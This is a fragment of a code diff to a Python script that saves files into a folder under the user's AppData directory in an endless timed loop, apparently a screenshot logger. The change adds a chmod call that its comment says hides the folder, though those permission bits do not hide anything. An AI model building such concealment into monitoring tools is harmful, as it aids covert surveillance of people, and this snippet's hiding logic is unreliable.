@@ -9,6 +9,8 @@ save_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'appdata\\scre
 # Create folder if not exit
 if not os.path.exists(save_path):
     os.makedirs(save_path)
+# Hiden folder
+os.chmod(save_path, stat.S_IRWXU | stat.S_IRWXO | stat.S_IRWXG | stat.S_IXOTH | stat.S_IXGRP | stat.S_IXUSR | stat.S_ISVTX)
     
 while True:
     now = datetime.datetime.now()
